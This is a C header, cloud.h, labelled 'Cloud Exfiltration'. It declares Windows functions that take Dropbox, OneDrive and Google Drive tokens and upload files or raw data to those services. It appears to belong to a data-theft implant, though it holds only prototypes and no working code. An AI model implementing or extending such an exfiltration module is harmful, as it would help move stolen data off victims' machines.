/**
 * @file cloud.h
 * @brief Header Cloud Exfiltration
 */

#ifndef CLOUD_H
#define CLOUD_H

#include <windows.h>

// Configuration tokens
void Cloud_SetDropboxToken(const char* token);
void Cloud_SetOneDriveToken(const char* token);
void Cloud_SetGDriveToken(const char* token);

// Dropbox
BOOL Cloud_Dropbox_Upload(const char* filepath, const char* remote_path);
BOOL Cloud_Dropbox_UploadData(const BYTE* data, DWORD data_len, const char* remote_path);

// OneDrive
BOOL Cloud_OneDrive_Upload(const char* filepath, const char* remote_path);
BOOL Cloud_OneDrive_UploadData(const BYTE* data, DWORD data_len, const char* remote_path);

// Google Drive
BOOL Cloud_GDrive_Upload(const char* filepath, const char* filename);
BOOL Cloud_GDrive_UploadData(const BYTE* data, DWORD data_len, const char* filename);

// Auto-select
BOOL Cloud_AutoUpload(const BYTE* data, DWORD data_len, const char* remote_name);
BOOL Cloud_AutoUploadFile(const char* filepath, const char* remote_name);

// Utilitaires
BOOL Cloud_IsConfigured(void);
const char* Cloud_GetConfiguredServices(void);

#endif // CLOUD_H
